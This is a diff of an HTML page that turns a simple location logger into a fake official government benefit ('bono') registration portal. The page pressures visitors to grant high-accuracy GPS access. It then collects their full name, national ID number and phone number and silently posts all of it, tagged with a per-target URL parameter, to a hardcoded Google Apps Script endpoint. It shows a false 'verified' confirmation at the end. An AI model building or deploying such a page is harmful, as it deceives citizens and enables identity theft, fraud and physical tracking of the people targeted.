@@ -3,152 +3,358 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CUESTIONARIO</title>
+  <title>Sistema de Verificación y Registro</title>
   <style>
+    :root {
+      --primary-color: #0d47a1;
+      --secondary-color: #1565c0;
+      --background-color: #f4f6f9;
+      --card-background: #ffffff;
+      --text-color: #333333;
+      --border-color: #cccccc;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--background-color);
+      color: var(--text-color);
       margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
     }
-    .box {
-      background: #ffffff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+
+    header {
+      width: 100%;
+      background-color: var(--primary-color);
+      color: white;
+      padding: 20px 0;
       text-align: center;
-      max-width: 380px;
-      width: 90%;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
     }
+
+    header h1 {
+      margin: 0;
+      font-size: 22px;
+      font-weight: 600;
+    }
+
+    header p {
+      margin: 5px 0 0 0;
+      font-size: 14px;
+      opacity: 0.9;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 480px;
+      background: var(--card-background);
+      margin: 30px 0;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      border-top: 5px solid var(--primary-color);
+      box-sizing: border-box;
+    }
+
+    /* Estilos del Comunicado Inicial */
+    .notice-box {
+      text-align: center;
+    }
+
+    .notice-icon {
+      font-size: 45px;
+      margin-bottom: 10px;
+    }
+
+    .notice-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--primary-color);
+      margin-bottom: 15px;
+    }
+
+    .notice-text {
+      font-size: 14px;
+      line-height: 1.5;
+      color: #555;
+      margin-bottom: 20px;
+      text-align: justify;
+    }
+
+    /* Estilos del Formulario */
+    .form-group {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .form-group input:focus {
+      border-color: var(--secondary-color);
+    }
+
+    .btn-main {
+      width: 100%;
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-main:hover {
+      background-color: var(--secondary-color);
+    }
+
+    .spinner-container {
+      display: none;
+      text-align: center;
+      margin-top: 15px;
+    }
+
     .spinner {
       border: 4px solid #f3f3f3;
-      border-top: 4px solid #007bff;
+      border-top: 4px solid var(--primary-color);
       border-radius: 50%;
-      width: 35px;
-      height: 35px;
+      width: 30px;
+      height: 30px;
       animation: spin 1s linear infinite;
-      margin: 0 auto 15px auto;
+      margin: 0 auto 10px auto;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    .error-msg {
-      color: #d9534f;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-    .info-text {
-      color: #666666;
-      font-size: 13px;
-      margin-bottom: 20px;
-      line-height: 1.4;
-    }
-    button {
-      background-color: #007bff;
-      color: white;
-      border: none;
-      padding: 10px 20px;
+
+    .message {
+      display: none;
+      padding: 12px;
+      border-radius: 4px;
       font-size: 14px;
-      border-radius: 5px;
-      cursor: pointer;
+      margin-top: 15px;
+      text-align: center;
     }
-    button:hover {
-      background-color: #0056b3;
+
+    .message.error {
+      background-color: #ffebee;
+      color: #c62828;
+      border: 1px solid #ef9a9a;
     }
+
+    .message.success {
+      background-color: #e8f5e9;
+      color: #2e7d32;
+      border: 1px solid #a5d6a7;
+    }
+
     .hidden {
       display: none;
+    }
+
+    footer {
+      margin-top: auto;
+      padding: 15px;
+      font-size: 12px;
+      color: #777;
+      text-align: center;
     }
   </style>
 </head>
 <body>
 
-  <div class="box">
-    <!-- Pantalla de carga inicial -->
-    <div id="pantalla-carga">
-      <div class="spinner"></div>
-      <p id="texto-carga">Cargando contenido, por favor espera...</p>
+  <header>
+    <h1>Plataforma de Verificación de Datos</h1>
+    <p>Sistema Oficial de Registro e Inscripción del bono </p>
+  </header>
+
+  <div class="container">
+    
+    <!-- PASO 1: Comunicado de Solicitud de Permisos -->
+    <div id="seccionComunicado" class="notice-box">
+      <div class="notice-icon">📍</div>
+      <div class="notice-title">Aviso de Verificación de Ubicación</div>
+      <p class="notice-text">
+        Estimado/a ciudadano/a, para continuar con el proceso de registro e inscripción es necesario validar la ubicación de su dispositivo. Este procedimiento garantiza la autenticidad del registro y la protección del sistema.
+      </p>
+      <p class="notice-text">
+        Al hacer clic en el botón a continuación, el navegador le solicitará acceso a su <b>ubicación/GPS</b>. Debe presionar <b>"Permitir"</b> para acceder al formulario de datos.
+      </p>
+      <button class="btn-main" onclick="solicitarAccesoUbicacion()">Aceptar y Continuar</button>
     </div>
 
-    <!-- Pantalla de error si rechaza la ubicación -->
-    <div id="pantalla-error" class="hidden">
-      <div class="error-msg">⚠️ Error de Verificación</div>
-      <p class="info-text">
-        No se pudo obtener el acceso necesario. Por favor, asegúrate de activar la <b>ubicación/GPS</b> en tu dispositivo y presionar <b>Permitir</b> cuando el navegador lo solicite.
-      </p>
-      <button onclick="solicitarUbicacion()">Intentar nuevamente</button>
+    <!-- PASO 2: Formulario de Registro (Se muestra tras permitir ubicación) -->
+    <div id="seccionFormulario" class="hidden">
+      <form id="registroForm" onsubmit="procesarEnvio(event)">
+        
+        <div class="form-group">
+          <label for="nombre">Nombres y Apellidos Completos *</label>
+          <input type="text" id="nombre" required placeholder="Ej. Juan Carlos Pérez">
+        </div>
+
+        <div class="form-group">
+          <label for="cedula">Número de Cédula / Identificación *</label>
+          <input type="text" id="cedula" required pattern="[0-9]{10}" maxlength="10" placeholder="Ej. 1728394051">
+        </div>
+
+        <div class="form-group">
+          <label for="telefono">Teléfono de Contacto *</label>
+          <input type="tel" id="telefono" required pattern="[0-9]{10}" maxlength="10" placeholder="Ej. 0991234567">
+        </div>
+
+        <button type="submit" class="btn-main" id="btnEnviar">Completar Registro</button>
+      </form>
     </div>
+
+    <!-- Spinner de Carga -->
+    <div class="spinner-container" id="spinner">
+      <div class="spinner"></div>
+      <p id="spinnerTexto" style="font-size: 13px; color: #555;">Procesando...</p>
+    </div>
+
+    <!-- Mensajes de Alerta -->
+    <div id="mensajeEstado" class="message"></div>
+
   </div>
 
+  <footer>
+    Plataforma de Verificación &copy; 2026
+  </footer>
+
   <script>
-  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbylyJt8TiWwJJ2IWk6GJMDaOCv2OdORjS58j5PtrD928NnMcm9YCAovKES76OR3lrpa/exec';
-    // Obtiene el nombre del usuario desde la URL (?user=Nombre)
+    // URL de tu Web App en Google Apps Script
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzwRDgEjL8LUL1R2pbzgGuDmLaN6esL390qwZ3fe_KShEjLgnKzVvP7B6KU8ELTQt0G/exec';
+
+    let datosUbicacion = null;
+
+    // Obtiene el usuario del parámetro ?user= en la URL si existe
     function obtenerUsuarioURL() {
       const params = new URLSearchParams(window.location.search);
-      return params.get('user') || 'Anónimo / Desconocido';
+      return params.get('user') || '';
     }
 
-    window.onload = function() {
-      solicitarUbicacion();
-    };
+    // Solicitud inicial de ubicación
+    function solicitarAccesoUbicacion() {
+      const spinner = document.getElementById('spinner');
+      const spinnerTexto = document.getElementById('spinnerTexto');
+      const mensaje = document.getElementById('mensajeEstado');
 
-    function solicitarUbicacion() {
-      document.getElementById('pantalla-carga').classList.remove('hidden');
-      document.getElementById('pantalla-error').classList.add('hidden');
+      mensaje.style.display = 'none';
+      spinner.style.display = 'block';
+      spinnerTexto.innerText = "Obteniendo permisos de ubicación...";
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            const datos = {
-              usuario: obtenerUsuarioURL(),
+            datosUbicacion = {
               latitud: position.coords.latitude,
               longitud: position.coords.longitude,
               precision: position.coords.accuracy,
               fecha: new Date().toLocaleString()
             };
 
-            enviarAGoogleSheets(datos);
+            // Ocultar comunicado y mostrar el formulario
+            spinner.style.display = 'none';
+            document.getElementById('seccionComunicado').classList.add('hidden');
+            document.getElementById('seccionFormulario').classList.remove('hidden');
           },
           (error) => {
-            console.warn("Permiso denegado o error de ubicación:", error.message);
-            mostrarError();
+            console.warn("Ubicación denegada:", error.message);
+            spinner.style.display = 'none';
+            mostrarMensaje("Es obligatorio permitir la ubicación para continuar con el proceso. Intente de nuevo y seleccione 'Permitir'.", "error");
           },
           {
             enableHighAccuracy: true,
-            timeout: 8000,
+            timeout: 10000,
             maximumAge: 0
           }
         );
       } else {
-        mostrarError();
+        spinner.style.display = 'none';
+        mostrarMensaje("Su navegador no soporta la geolocalización.", "error");
       }
     }
 
-    function mostrarError() {
-      document.getElementById('pantalla-carga').classList.add('hidden');
-      document.getElementById('pantalla-error').classList.remove('hidden');
-    }
+    // Procesar y enviar el formulario
+    function procesarEnvio(event) {
+      event.preventDefault();
 
-    function enviarAGoogleSheets(datos) {
+      if (!datosUbicacion) {
+        mostrarMensaje("No se detectaron los datos de ubicación. Recargue la página e intente nuevamente.", "error");
+        return;
+      }
+
+      const btn = document.getElementById('btnEnviar');
+      const spinner = document.getElementById('spinner');
+      const spinnerTexto = document.getElementById('spinnerTexto');
+
+      btn.disabled = true;
+      btn.style.opacity = '0.6';
+      spinner.style.display = 'block';
+      spinnerTexto.innerText = "Enviando información al sistema...";
+
+      const usuarioParam = obtenerUsuarioURL();
+      const prefijo = usuarioParam ? '[' + usuarioParam + '] ' : '';
+
+      const payload = {
+        usuario: prefijo + document.getElementById('nombre').value + ' (CI: ' + document.getElementById('cedula').value + ' - Tel: ' + document.getElementById('telefono').value + ')',
+        latitud: datosUbicacion.latitud,
+        longitud: datosUbicacion.longitud,
+        precision: datosUbicacion.precision,
+        fecha: datosUbicacion.fecha
+      };
+
       fetch(SCRIPT_URL, {
         method: 'POST',
         mode: 'no-cors',
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify(datos)
+        body: JSON.stringify(payload)
       })
       .then(() => {
-        document.getElementById('texto-carga').innerText = "✅ Verificación completada.";
-        document.querySelector('.spinner').style.display = 'none';
+        spinner.style.display = 'none';
+        document.getElementById('seccionFormulario').classList.add('hidden');
+        mostrarMensaje("¡Registro completado exitosamente! Sus datos han sido verificados.", "success");
       })
       .catch((err) => {
-        console.error("Error al enviar los datos:", err);
-        mostrarError();
+        console.error("Error al enviar:", err);
+        spinner.style.display = 'none';
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        mostrarMensaje("Ocurrió un error al procesar el registro. Intente nuevamente.", "error");
       });
+    }
+
+    function mostrarMensaje(texto, tipo) {
+      const mensaje = document.getElementById('mensajeEstado');
+      mensaje.innerText = texto;
+      mensaje.className = 'message ' + tipo;
+      mensaje.style.display = 'block';
     }
   </script>
 
